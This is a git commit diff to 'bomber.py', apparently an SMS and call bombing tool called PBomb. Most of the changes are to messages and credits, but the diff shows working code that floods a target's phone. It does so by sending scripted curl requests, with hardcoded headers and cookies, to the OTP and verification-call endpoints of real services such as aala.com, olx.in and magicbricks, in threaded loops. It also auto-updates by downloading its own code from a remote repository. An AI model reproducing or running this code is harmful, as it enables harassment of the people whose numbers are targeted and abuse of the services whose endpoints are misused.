6ff34639565c0a2530806b76b42c0ebfe315aa3f
Hacker Y2J <60312092+HACK3RY2J@users.noreply.github.com>
2020-02-23 15:54:54 +0530

    Update bomber.py

--- bomber.py
+++ bomber.py
@@ -14,14 +14,14 @@ import urllib.parse
 try:
     import requests
 except ImportError:
-    print('[!] Error: some dependencies are not installed')
+    print('Error !! : Some dependencies are not installed')
     print('Type \'pip install -r requirements.txt\' to install all required packages')
     exit()
 
 colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']
 W='\033[0m'
-# The Credit For This Code Goes To Panda Hackers And All Other Contributors Listed At https://github.com/HACK3RY2J/PBomb
-# If You Wanna Take Credits For This Code, Please Look Yourself Again
+# The Credit For This Code Goes To Panda Hackers https://github.com/HACK3RY2J/PBomb
+# If You Wanna Take Credits, Please Look Yourself Again!!
 
 country_codes = {
     '93': 'AF',
@@ -274,7 +274,7 @@ def infinite(pn, dl, ch, max):
             continue
         os.system('rm proc.xxx >/dev/null 2>&1')
         count_inf += 1
-        # os.system('echo Panda Hackers >> count.xxx')
+        # os.system('echo SpeedX >> count.xxx')
         time.sleep(float(dl))
         if (count_inf > maxlim):
             exit()
@@ -288,7 +288,7 @@ def checkinternet():
     except Exception:
         res = True
     if res:
-        print("\n\n\tIt seems That Your Internet Speed is Slow or You Are Using Proxies...")
+        print("\n\n\tIt Looks That Your Internet Speed is Slow....")
         print('\t\tPBomb Will Stop Now...\n\n')
         banner()
         exit()
@@ -367,7 +367,7 @@ def getapi(pn, lim, cc):
         rd = hashlib.md5(open('temp.xxx2', 'rb').read()).hexdigest()
         return rd == '24f467b24087ff48c96321786d89c69f'
     elif lim == 15:
-        rd = os.popen('curl -s -X POST -H "Host:www.aala.com" -H "Connection:keep-alive" -H "Accept:application/json, text/javascript, */*; q=0.01" -H "Origin:https://www.aala.com" -H "X-Requested-With:XMLHttpRequest" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Referer:https://www.aala.com/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5" -H "Cookie:frontend=a27mn3h3irt1rlt6i55s93p9r5; frontend_cid=8zqBBzwQTMIt9UKg; _BEAMER_USER_ID_gADrycBn12870=c9fe4f7d-b421-4bad-9cf2-0a4db716dff4; G_ENABLED_IDPS=google" -d \'email=' + cc + pn + '&firstname=Panda Hackers&lastname=Panda Hackers\' "https://www.aala.com/accustomer/ajax/getOTP"').read().strip()
+        rd = os.popen('curl -s -X POST -H "Host:www.aala.com" -H "Connection:keep-alive" -H "Accept:application/json, text/javascript, */*; q=0.01" -H "Origin:https://www.aala.com" -H "X-Requested-With:XMLHttpRequest" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Referer:https://www.aala.com/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5" -H "Cookie:frontend=a27mn3h3irt1rlt6i55s93p9r5; frontend_cid=8zqBBzwQTMIt9UKg; _BEAMER_USER_ID_gADrycBn12870=c9fe4f7d-b421-4bad-9cf2-0a4db716dff4; G_ENABLED_IDPS=google" -d \'email=' + cc + pn + '&firstname=SpeedX&lastname=SpeedX\' "https://www.aala.com/accustomer/ajax/getOTP"').read().strip()
         return rd.find('code:') != -1
     elif lim == 16:
         os.popen('curl -s -X POST -d \'method=SMS&countryCode=id&phoneNumber=' + cc + pn +
@@ -389,11 +389,11 @@ def getapi(pn, lim, cc):
             'curl -s -X POST -H "Host:www.olx.in" -H "content-length:44" -H "accept:*/*" -H "x-newrelic-id:VQMGU1ZVDxABU1lbBgMDUlI=" -H "origin:https://www.olx.in" -H "user-agent:Mozilla/5.0 (Linux; Android 5.0.2; SH-04G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/json" -H "referer:https://www.olx.in/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" -H "cookie:onap=16b1b8f48d4x746d47ab-1-16b1b8f48d4x746d47ab-19-1559537345" -H "cookie:bm_sv=CDB97F50DA6615AC420F3E6E77B04E42~OoX2fAuP7ggcNa0VjzE95FzJNKRdJlW09Hja0/cysIGF1sJoBO7i0ndGXqnTWLaunlyxktHLbE8BSstPCRYn8VdP15lvUxK3ZY9ahXOSgwAidxwXd1jCe5wjIzYbiXp5eKNWfFpowhFbpxloe+SrbiE0YHJVPcCV5bmdsHgPfQc=" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:hint=true" -H "cookie:_gid=GA1.2.369819276.1559535517" -H "cookie:_ga=GA1.2.665688753.1559535517" -H "cookie:ldTd=true" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:HIDE_ONBOARDING_LOCATION=true" -H "cookie:testCookie=testCookie" -H "cookie:ak_bmsc=307C5311FB00A3F4E856AFFE1A9D000B0214BED9E0210000909FF45C1E802067~plFZfbMQGgEDr7OWVe9FvqfT24ZtOVMamtYcaip71IYOrv2+SQ6fokSvMk2Uesz5v1sFfaichbtDgeVSj3te3vXJKezSWgvoVWrK7gfzFrLz1ruBm0MQj01V5CmpaTr6tRgDRSN6bks3nqvOHzR0tA1IoqfDfq2MKtmDjbknCI5FlLYUTwqlnwHowYArfybn2n3yilE6VKHjW+tH8kqjAfH8BGuijpmO9pNkgmIyOeaZIVM3k6FGOL3Wj3jLI8uGaU" -H "cookie:_abck=153BD3D333948A58932748CAC3D4C3F40214BED9E0210000909FF45C18838E05~0~8O+udxdG38sBFTPZpaBL4IGj7eUcKJ1VwAtJ52GMO5E=~-1~-1" -H "cookie:bm_sz=BD665D919F7C6FA8374F196445596436~YAAQ2b4UArpOAwtrAQAAq0qPGwNksHBgphLwDzwfBlwIRQJAG7txmjBo/of7NiAJ93gy/7vBhQ9l5sIKdwtl2j+U4bys2Hhh5tZlZL/jqdnW/JrgmgawcxiunAJ32BbY9UtnFIrNxbbRvzQCYnSwf/cz9a7jURsui7leuLaVm7mQEcHPOtC6g5jrToAMTbdA" -H "cookie:97c09e2aabdfed89b87a3010d7f13c64=353b4f9fd82d26268ad11b2c1e9ae019" -H "cookie:lqstatus=1559536704" -H "cookie:laquesis=pan-26381@a#pan-27752@b#pan-30043@b#pana-26381@b" -d \'{"type":"call","descriptor":"+91' + pn + '"}\' "https://www.olx.in/api/challenges" >/dev/null 2>&1')
         return True
     elif lim == 104:
-        rd = os.popen('curl -s -X GET -H "Host:api.magicbricks.com" -H "Connection:keep-alive" -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Safari/537.36" -H "Save-Data:on" -H "Accept:image/webp,image/apng,image/*,*/*;q=0.8" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" "<https://api.magicbricks.com/bricks/verifyOnCall.html?mobile=' + pn + '>"').read().decode('utf-8')
+        rd = os.popen('curl -s -X GET -H "Host:api.magicbricks.com" -H "Connection:keep-alive" -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Safari/537.36" -H "Save-Data:on" -H "Accept:image/webp,image/apng,image/*,*/*;q=0.8" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile=' + pn + '"').read().decode('utf-8')
         return rd.lower().strip().find('callmade') != -1
     elif lim == 106:
         rd = os.popen(
-            'curl -s "<https://www.myupchar.com/user_profile/resend_otp_via_voice?id=' + pn + '>"').read()
+            'curl -s "https://www.myupchar.com/user_profile/resend_otp_via_voice?id=' + pn + '"').read()
         return rd.find("1") != -1
     return False
 
@@ -424,7 +424,7 @@ def start(target, counter, delay, ch, cc):
             else:
                 if success > 0:
                     print(
-                        '\n\n\tWe Are Sorry To Say That Bombing Limit For Your Country Has Been Reached...')
+                        '\n\n\tBombing Limit For Your Country Has Been Reached...')
                     print(
                         '\nWe Are Working Too Hard To Increase The International Limit...')
                     input(
@@ -436,21 +436,21 @@ def start(target, counter, delay, ch, cc):
                 else:
                     print('\n\n\tSorry Your Country is Not Supported...')
                     print(
-                        '\t\tPlease Send A Mail To Pandahackers127@gmail.com To Let Us Know...')
+                        '\t\tPlease Send A Mail To pandahackers127@gmail.com To Let Us Know...')
                     input('Press Enter To Exit...')
                     exit()
         print(random.choice(colors))
         print("==================================================================")
-        print("                BOMBING in progress, please wait !!               ")
-        print("     Please keep your data connection active during bombing !!    ")
-        print("==================================================================")
-        print("             Target Number           : +" + str(cc) + " ", target)
-        print("             Number of Requests Sent : ", requested)
-        print("             Successful Requests     : ", success)
-        print("             Failed Requests         : ", failed)
-        print("==================================================================")
-        print("              Use this for fun, not for revenge !!                ")
-        print("              This Bomber Was Created By Panda Hackers !!                ")
+        print("     We Are Bombing On The Number, Have Patience!!               ")
+        print("     Keep your data connection active during bombing !!    ")
+        print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
+        print("             Number  On Bombing          : +" + str(cc) + " ", target)
+        print("             Number of Bombs Sent       : ", requested)
+        print("             Successful Bombs                  : ", success)
+        print("             Failed Bombs                          : ", failed)
+        print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
+        print("                                              Use It for fun, not for revenge !!     ")
+        print("                               This Bomber Is Maintained By Panda Hackers !!    ")
         print("==================================================================")
         try:
             result = getapi(target, api, cc)
@@ -467,7 +467,7 @@ def start(target, counter, delay, ch, cc):
         if requested % 3 == 0:
             checkinternet()
     print(W)
-    print('\n\nBombing Completed..')
+    print('\n\nBombing Succesful....')
     os.system('rm *.xxx* > /dev/null 2>&1')
     banner()
     exit()
@@ -477,12 +477,12 @@ def update():
     stuff_to_update = ['bomber.py', '.version']
     for fl in stuff_to_update:
         dat = urllib.request.urlopen(
-            "https://raw.githubusercontent.com/HACK3RY2J/TBomb/master/" + fl).read()
+            "https://raw.githubusercontent.com/HACK3RY2J/PBomb/master/" + fl).read()
         file = open(fl, 'wb')
         file.write(dat)
         file.close()
     print('\n\t\tUpdated Successfull !!!!')
-    print('\tPlease Run The Script Again...')
+    print('\tRun The Script Again...')
     exit()
 
 
@@ -491,13 +491,13 @@ banner()
 try:
     urllib.request.urlopen('https://www.google.com')
 except Exception:
-    print("You are not connected To Internet!!!")
+    print("Error While Connecting To Internet!!!")
     print("\tPlease Connect To Internet To Continue...\n")
     input('Exiting....\n Press Enter To Continue....')
     exit()
 print('\tChecking For Updates...')
 ver = urllib.request.urlopen(
-    "https://raw.githubusercontent.com/HACK3RY2J/TBomb/master/.version").read().decode('utf-8')
+    "https://raw.githubusercontent.com/HACK3RY2J/PBomb/master/.version").read().decode('utf-8')
 verl = ''
 try:
     verl = open(".version", 'r').read()
@@ -505,13 +505,14 @@ except Exception:
     pass
 if ver != verl:
     print('\n\t\tAn Update is Available....')
-    print('\tStarting Update...')
+    print('\tUpdating PBomb...')
     update()
+print("Congratulation")
 print("Your Version is Up-To-Date")
-print('\n\n\t\t\tStarting PBomb...\n\n')
+print('\n\n\t\t\tBeginning PBomb...\n\n')
 try:
     noti = urllib.request.urlopen(
-        "https://raw.githubusercontent.com/HACK3RY2J/TBomb/master/.notify").read().decode('utf-8')
+        "https://raw.githubusercontent.com/HACK3RY2J/PBomb/master/.notify").read().decode('utf-8')
     noti = noti.upper().strip()
     if len(noti) > 10:
         print('\n\n\tNOTIFICATION: ' + noti + '\n\n')
@@ -545,10 +546,10 @@ try:
 except Exception:
     type = 0
 if type == 1:
-    nm = int(input("Enter Number of Calls To Send(Maximum 15): "))
-    if nm > 15:
+    nm = int(input("Enter Number of Calls To Send(Maximum 50): "))
+    if nm > 50:
         print("\t\tYou Have Entered " + str(nm) +
-              ".\n\tNormalizing Value To 15")
+              ".\n\tNormalizing Value To 50")
         nm = 15
     dl = float(input("Enter Delay time (in seconds) [Recommended 10 sec ] : "))
 elif type == 0:
@@ -573,7 +574,7 @@ if nm > maxlim:
 if not cc.strip() == "91":
     if type == 1:
         print(
-            '\t\tSorry But Call Bombing is Currently Supported Only For Indian Numbers!!!!')
+            '\t\tSorry Call Bombing is Not Supported In Your Region!!!!')
         print()
         input('Press Enter To Exit....')
         print('\n\n')
@@ -581,7 +582,7 @@ if not cc.strip() == "91":
         exit()
     cnt = 0
     if pn.strip() == '' or dl <= 0 or nm <= 0 or cc.strip() == '' or cc.find('+') != -1:
-        print('\n\n\tSeems Like You Have Given Wrong Inputs...')
+        print('\n\n\tWrong Inputs Detected...')
         input('\n\t\tPress Enter To Exit...')
         banner()
         exit()
@@ -591,13 +592,13 @@ if not cc.strip() == "91":
 ch = [i for i in range(17)]
 cbomb = False
 if pn.strip() == '' or dl <= 0 or nm < 0:
-    print('\n\n\tSeems Like You Have Given Wrong Inputs...')
+    print('\n\n\tWrong Inputs Detected...')
     input('\n\t\tPress Enter To Exit...')
     banner()
     exit()
 if type == 1:
     print("NOTE: Call Bomb Might Not Work on DND Activated Numbers...\n")
-    print("\n\tPlease Don't Overload Call Bomb So That Is Would Work For Longer Period Of Time...")
+    print("\n\tPlease Don't Overload Call Bomb So That It Would Work For Longer Period Of Time...")
     cbomb = True
 if cbomb:
     chl = [100, 101, 102, 103, 104, 105, 106]
@@ -613,18 +614,18 @@ if nm == 0:
     print("\n\n==================================================================")
     print("                Gearing Up Bomber, please wait !!               ")
     print("     Please keep your data connection active during bombing !!    ")
-    print("==================================================================")
+    print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
     print("             Target Number       : +91", pn)
     print("             Number of Threads   : ", nt)
     print("             Delay               : ", dl)
-    print("==================================================================")
-    print("              Use this for fun, not for revenge !!                ")
+    print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
+    print("              Use It for fun, Using For Revenge Is Strictly Prohibited !!                ")
     print("              This Bomber Was Created By Panda Hackers !!                ")
     print("==================================================================")
     print(W)
-    input('\n\nPress CTRL+Z To STOP Bomber... \nPress Enter To Start Bomber...\n')
+    input('\n\nPress CTRL+Z To STOP Bomber... \nPress Enter To Begin Bomber...\n')
     os.system('rm *.xxx* > /dev/null 2>&1')
-    print("\n\nStarting Bomb....")
+    print("\n\nBegining Bomber....")
     for i in range(nt):
         t[i] = threading.Thread(target=infinite, args=(pn, dl, ch, maxlim,))
         t[i].daemon = True
@@ -634,7 +635,7 @@ if nm == 0:
     while True:
         ci += 1
         l = count_inf
-        print("    Total Number of Requests Sent : ", l)
+        print("    Total Number of Bombs Sent : ", l)
         if int(l) > maxlim:
             print('\n\n\tSorry Due To Misuse Of This Script We Only Provide ' +
                   str(maxlim) + ' SMS At Once...\n\n')
